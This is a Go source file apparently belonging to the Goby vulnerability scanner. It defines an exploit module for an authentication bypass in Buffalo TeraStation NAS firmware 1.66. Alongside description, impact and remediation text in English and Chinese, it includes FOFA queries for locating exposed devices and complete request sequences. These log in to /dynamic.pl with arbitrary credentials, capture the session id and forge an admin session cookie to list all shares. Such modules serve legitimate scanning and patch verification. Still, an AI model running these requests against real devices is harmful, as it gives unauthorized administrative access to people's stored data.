package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Buffalo TeraStation Network Attached Storage (NAS) 1.66 dynamic.pl sid Authentication Bypass Vulnerability",
    "Description": "<p>Buffalo TeraStation Network Attached Storage (NAS) is purpose-built as efficient data storage and backup solutions for small businesses.</p><p>An authentication bypass vulnerability found within the web interface of a Buffalo TeraStation Series Network Attached Storage (NAS) device, allows an unauthenticated malicious actor to gain administrative privileges.</p>",
    "Product": "BUFFALO-TeraStation",
    "Homepage": "https://www.buffalotech.com/",
    "DisclosureDate": "2022-08-11",
    "Author": "s0m30ne",
    "FofaQuery": "body=\"dynamic.pl\" && body=\"Buffalo\"",
    "GobyQuery": "body=\"dynamic.pl\" && body=\"Buffalo\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows an unauthenticated attacker to gain administrative privileges on a Buffalo LinkStation. All attached storage devices may then be accessed by the attacker. This puts the available data at risk as confidential information may be disclosed, valuable information destroyed or manipulated. Depending on the firmware of the device, an attacker may also be able execute malicious code on the LinkStation either via installing a customized firmware image or by exploiting a publicly disclosed remote command injection vulnerability.</p>",
    "Recommendation": "<p>1. Disable access to the web interface, for example via an ACL in the responsible ethernet switch.</p><p>2. Update firmware version 1.71 or higher to ensure proper server-side authentication.</p><p>3. Disable the \"guest\" user account, which is by default present and enabled.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/51012"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dynamic.pl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "bufaction=verifyLogin&user=Jordan&password=Jordan"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"sid\":\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"pageMode\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "sessionId|lastbody|regex|{\"sid\":\"(\\w+)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/dynamic.pl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "webui_session_Jordan={{{sessionId}}}_en_0"
                },
                "data_type": "text",
                "data": "bufaction=getShareAllList"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"success\":true,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/dynamic.pl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "bufaction=verifyLogin&user=Jordan&password=Jordan"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"sid\":\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"pageMode\":",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "sessionId|lastbody|regex|{\"sid\":\"(\\w+)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/dynamic.pl",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "webui_session_Jordan={{{sessionId}}}_en_0"
                },
                "data_type": "text",
                "data": "bufaction=getShareAllList"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"success\":true,",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|Cookie: webui_session_Jordan={{{sessionId}}}_en_0"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "Buffalo TeraStation Network Attached Storage (NAS) 1.66 dynamic.pl 文件存在认证绕过漏洞",
            "Product": "BUFFALO-TeraStation",
            "Description": "<p>Buffalo TeraStation NAS 设备致力于为小型企业提供数据存储和备份解决方案。</p><p>Buffalo TeraStation 系列的NAS设备开放的WEB管理后台存在认证绕过漏洞，未授权的恶意攻击者利用该漏洞可获取管理员权限</p>",
            "Recommendation": "<p>1、 配置ACL，禁止设备暴露在互联网；</p><p>2、 将固件升级到1.71及以上版本，具体升级方法请咨询官方技术支持<a href=\"https://buffaloamericas.com/support\">https://buffaloamericas.com/support</a>；</p><p>3、 禁用guest账户</p>",
            "Impact": "<p>攻击者可利用此漏洞获取Buffalo NAS设备的管理员权限，从而获取其中存储数据的访问权限，造成数据泄露或损坏。另外攻击者通过安装恶意的固件镜像，或者其他公开的漏洞，可能实现在设备上执行任意命令，从而获取服务器Shell权限。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Buffalo TeraStation Network Attached Storage (NAS) 1.66 dynamic.pl sid Authentication Bypass Vulnerability",
            "Product": "BUFFALO-TeraStation",
            "Description": "<p>Buffalo TeraStation Network Attached Storage (NAS) is purpose-built as efficient data storage and backup solutions for small businesses.</p><p>An authentication bypass vulnerability found within the web interface of a Buffalo TeraStation Series Network Attached Storage (NAS) device, allows an unauthenticated malicious actor to gain administrative privileges.</p>",
            "Recommendation": "<p>1. Disable access to the web interface, for example via an ACL in the responsible ethernet switch.</p><p>2. Update firmware version 1.71 or higher to ensure proper server-side authentication.</p><p>3. Disable the \"guest\" user account, which is by default present and enabled.</p>",
            "Impact": "<p>This vulnerability allows an unauthenticated attacker to gain administrative privileges on a Buffalo LinkStation. All attached storage devices may then be accessed by the attacker. This puts the available data at risk as confidential information may be disclosed, valuable information destroyed or manipulated. Depending on the firmware of the device, an attacker may also be able execute malicious code on the LinkStation either via installing a customized firmware image or by exploiting a publicly disclosed remote command injection vulnerability.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
